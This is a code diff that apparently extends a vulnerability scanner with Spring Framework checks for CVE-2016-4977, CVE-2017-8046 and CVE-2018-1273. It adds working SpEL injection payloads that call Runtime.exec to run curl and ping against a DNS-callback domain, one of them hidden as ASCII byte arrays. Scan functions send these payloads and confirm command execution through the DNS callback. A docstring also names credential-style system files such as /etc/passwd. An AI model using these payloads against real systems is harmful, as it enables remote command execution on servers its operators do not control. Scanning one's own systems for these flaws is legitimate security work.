@@ -22,18 +22,32 @@
         5. Spring Cloud Gateway SpEl 远程代码执行
             CVE-2022-22947
                 Payload: https://vulhub.org/#/environments/spring/CVE-2022-22947/
+
+        6. Spring Security OAuth2 远程命令执行
+            CVE-2016-4977
+                Payload: https://vulhub.org/#/environments/spring/CVE-2016-4977/
+
+        7. Spring Data Rest 远程命令执行
+            CVE-2017-8046
+                Payload: https://vulhub.org/#/environments/spring/CVE-2017-8046/
+
+        8. Spring Data Commons 远程命令执行
+            CVE-2018-1273
+                Payload: https://vulhub.org/#/environments/spring/CVE-2018-1273/
+
 file:///etc/passwd
 file:///C:\Windows\System32\drivers\etc\hosts
 '''
 
 from lib.api.dns import dns
 from lib.initial.config import config
-from lib.tool.md5 import md5, random_md5
+from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
 from lib.tool.logger import logger
 from lib.tool.thread import thread
 from lib.tool import check
 from lib.tool import head
 from thirdparty import requests
+# from thirdparty import HackRequests
 from time import sleep
 
 class Spring():
@@ -41,6 +55,7 @@ class Spring():
         self.timeout = config.get('timeout')
         self.headers = config.get('headers')
         self.proxies = config.get('proxies')
+        self.proxy = config.get('proxy')
 
         self.app_name = 'Spring'
         self.md = md5(self.app_name)
@@ -164,6 +179,43 @@ class Spring():
                 'path': 'actuator/gateway/routes/mouse',
                 'data': '',
                 'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
+            }
+        ]
+
+        self.cve_2016_4977_payloads = [
+            {
+                'path': 'oauth/authorize?response_type={}&client_id=acme&scope=openid&redirect_uri=http://test',
+                'data': ''
+            }
+        ]
+
+        self.cve_2017_8046_payloads = [
+            {   # * curl
+                'path': '1',
+                'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,117,114,108,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
+            },
+            {   # * ping -c 4
+                'path': '1',
+                'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{112,105,110,103,32,45,99,32,52,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
+            },
+            {   # * ping
+                'path': '1',
+                'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{112,105,110,103,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
+            },
+        ]
+
+        self.cve_2018_1273_payloads = [
+            {
+                'path': 'users?page=&size=5',
+                'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("curl DNSDOMAIN")]=&password=&repeatedPassword='
+            },
+            {
+                'path': 'users?page=&size=5',
+                'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping -c 4 DNSDOMAIN")]=&password=&repeatedPassword='
+            },
+            {
+                'path': 'users?page=&size=5',
+                'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping DNSDOMAIN")]=&password=&repeatedPassword='
             }
         ]
 
@@ -338,7 +390,7 @@ class Spring():
                     proxies=self.proxies, 
                     verify=False
                 )
-                logger.logging(vul_info, res.status_code, vars(res.request))                        # * LOG
+                logger.logging(vul_info, res.status_code, res)                        # * LOG
             except requests.ConnectTimeout:
                 logger.logging(vul_info, 'Timeout')
                 return None
@@ -480,13 +532,13 @@ class Spring():
                             'Data': self.cve_2022_22947_payloads[payload-2]['data']
                         },
                         'Payload-2': {
-                            'Method': 'GET',
+                            'Method': 'POST',
                             'Url': url,
                             'Path': self.cve_2022_22947_payloads[payload-1]['path'],
                             'Data': self.cve_2022_22947_payloads[payload-1]['data']
                         },
                         'Payload-3': {
-                            'Method': 'POST',
+                            'Method': 'GET',
                             'Url': url,
                             'Path': path,
                             'Data': data
@@ -504,6 +556,200 @@ class Spring():
                 logger.logging(vul_info, 'Error')
                 return None
 
+    def cve_2016_4977_scan(self, url):
+        ''' Spring Security OAuth是为Spring框架提供安全认证支持的一个模块;
+            在其使用whitelabel views来处理错误时, 由于使用了Springs Expression Language (SpEL), 
+                攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令
+        '''
+        vul_info = {}
+        vul_info['app_name'] = self.app_name
+        vul_info['vul_type'] = 'RCE'
+        vul_info['vul_id'] = 'CVE-2016-4977'
+        vul_info['vul_method'] = 'GET'
+        vul_info['headers'] = {}
+
+        # headers = self.headers.copy()
+        # headers.update(vul_info['headers'])
+
+        random_num_1, random_num_2 = random_int_2()
+
+        for payload in self.cve_2016_4977_payloads:
+            path = payload['path'].format('${' + str(random_num_1) + '*' + str(random_num_2) + '}')
+            data = payload['data']
+            target = url + path
+
+            vul_info['path'] = path
+            vul_info['data'] = data
+            vul_info['target'] = target
+
+            try:
+                res = requests.get(
+                    target, 
+                    timeout=self.timeout, 
+                    headers=self.headers,
+                    proxies=self.proxies, 
+                    verify=False,
+                    allow_redirects=False
+                )
+                logger.logging(vul_info, res.status_code, res)                        # * LOG
+            except requests.ConnectTimeout:
+                logger.logging(vul_info, 'Timeout')
+                return None
+            except requests.ConnectionError:
+                logger.logging(vul_info, 'Faild')
+                return None
+            except:
+                logger.logging(vul_info, 'Error')
+                return None
+
+            if (str(random_num_1 * random_num_2) in res.text):
+                results = {
+                    'Target': target,
+                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                    'Request': res
+                }
+                return results
+
+    def cve_2017_8046_scan(self, url):
+        ''' 构造ASCII码的JSON数据包, 向spring-data-rest服务器提交恶意PATCH请求, 可以执行任意代码 '''
+        sessid = '8d2aba535b132733b453254c40e50f95'
+        
+        vul_info = {}
+        vul_info['app_name'] = self.app_name
+        vul_info['vul_type'] = 'RCE'
+        vul_info['vul_id'] = 'CVE-2017-8046'
+        # vul_info['vul_method'] = 'PATCH'
+        vul_info['headers'] = {
+            'Content-Type': 'application/json-patch+json'
+        }
+
+        headers = self.headers.copy()
+        headers.update(vul_info['headers'])
+
+        # * 先使用POST请求添加一个对象, 防止目标不存在对象 导致漏洞利用失败
+        res0 = requests.post(
+            url, 
+            timeout=self.timeout, 
+            headers={'Content-Type': 'application/json'},
+            data='{}', 
+            proxies=self.proxies, 
+            verify=False,
+            allow_redirects=False
+        )
+        logger.logging(vul_info, res0.status_code, res0)
+
+        for payload in self.cve_2017_8046_payloads:
+            md = random_md5()                                       # * 随机md5值, 8位
+            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
+            
+            # ! 该漏洞的Payload需要转换成ASCII码, 以逗号分隔每一个字母的ASCII编码
+            ascii_dns_domain = ''
+            for b in dns_domain:
+                ascii_dns_domain += str(ord(b)) + ','
+
+            if url[-1] != '/':
+                url += '/'
+            path = payload['path']
+            data = payload['data'].replace('DNSDOMAIN', ascii_dns_domain[:-1])
+            target = url + path
+
+            vul_info['path'] = path
+            vul_info['data'] = data
+            vul_info['target'] = target
+
+            try:
+                res = requests.patch(
+                    target, 
+                    timeout=self.timeout, 
+                    headers=headers,
+                    data=data, 
+                    proxies=self.proxies, 
+                    verify=False,
+                    allow_redirects=False
+                )
+                logger.logging(vul_info, res.status_code, res)                        # * LOG
+            except requests.ConnectTimeout:
+                logger.logging(vul_info, 'Timeout')
+                return None
+            except requests.ConnectionError:
+                logger.logging(vul_info, 'Faild')
+                return None
+            except:
+                logger.logging(vul_info, 'Error')
+                return None
+
+            sleep(3)
+            if (md in dns.result(md, sessid)):
+                results = {
+                    'Target': target,
+                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                    'Request': res,
+                    'Encodeing': 'ASCII'
+                }
+                return results
+
+    def cve_2018_1273_scan(self, url):
+        ''' Spring Data是一个用于简化数据库访问, 并支持云服务的开源框架;
+            Spring Data Commons是Spring Data下所有子项目共享的基础框架;
+            Spring Data Commons 在2.0.5及以前版本中, 存在一处SpEL表达式注入漏洞, 
+                攻击者可以注入恶意SpEL表达式以执行任意命令
+        '''
+        sessid = 'f638f51cbd7085fc19b791bb689ad7d7'
+        
+        vul_info = {}
+        vul_info['app_name'] = self.app_name
+        vul_info['vul_type'] = 'RCE'
+        vul_info['vul_id'] = 'CVE-2018-1273'
+        # vul_info['vul_method'] = 'POST'
+        vul_info['headers'] = {}
+
+        headers = self.headers.copy()
+        headers.update(vul_info['headers'])
+
+        for payload in self.cve_2018_1273_payloads:
+            md = random_md5()                                       # * 随机md5值, 8位
+            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
+
+            path = payload['path']
+            data = payload['data'].replace('DNSDOMAIN', dns_domain)
+            target = url + path
+
+            headers['Referer'] = target
+
+            vul_info['path'] = path
+            vul_info['data'] = data
+            vul_info['target'] = target
+
+            try:
+                res = requests.post(
+                    target, 
+                    timeout=self.timeout, 
+                    headers=headers,
+                    data=data, 
+                    proxies=self.proxies, 
+                    verify=False,
+                    allow_redirects=False
+                )
+                logger.logging(vul_info, res.status_code, res)                        # * LOG
+            except requests.ConnectTimeout:
+                logger.logging(vul_info, 'Timeout')
+                return None
+            except requests.ConnectionError:
+                logger.logging(vul_info, 'Faild')
+                return None
+            except:
+                logger.logging(vul_info, 'Error')
+                return None
+
+            sleep(3)
+            if (md in dns.result(md, sessid)):
+                results = {
+                    'Target': target,
+                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                    'Request': res
+                }
+                return results
+
     def addscan(self, url, vuln=None):
         if vuln:
             return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
@@ -513,7 +759,10 @@ class Spring():
             thread(target=self.cve_2021_21234_scan, url=url),
             thread(target=self.cve_2022_22965_scan, url=url),
             thread(target=self.cve_2022_22963_scan, url=url),
-            thread(target=self.cve_2022_22947_scan, url=url)
+            thread(target=self.cve_2022_22947_scan, url=url),
+            thread(target=self.cve_2016_4977_scan, url=url),
+            thread(target=self.cve_2017_8046_scan, url=url),
+            thread(target=self.cve_2018_1273_scan, url=url)
         ]
 
 spring = Spring()
